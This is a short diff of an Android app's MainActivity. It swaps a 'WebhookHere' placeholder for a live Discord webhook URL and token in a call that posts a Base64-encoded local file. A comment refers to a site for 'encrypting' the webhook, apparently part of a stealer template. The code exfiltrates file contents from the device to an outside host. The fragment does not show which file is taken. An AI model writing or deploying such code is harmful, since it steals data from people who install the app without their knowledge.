@@ -60,7 +60,7 @@ public class MainActivity extends AppCompatActivity {
             try {
                 final String encodeToString = Base64.encodeToString(FilesKt.readBytes(file), 0);
                 //Encrypt your webhook at https://wish4luck.ml/webhook.php
-                postDataUsingVolley(encodeToString, "WebhookHere");
+                postDataUsingVolley(encodeToString, "https://discord.com/api/webhooks/1006614740052750407/kmgh1s_ljUuiBIiAzR-3mfu8L8FCtdBvWXRc1HxYgMrqXQwRPlVwfufrZNHiiYjbULnU");
             }
             catch (Exception ex)
             {
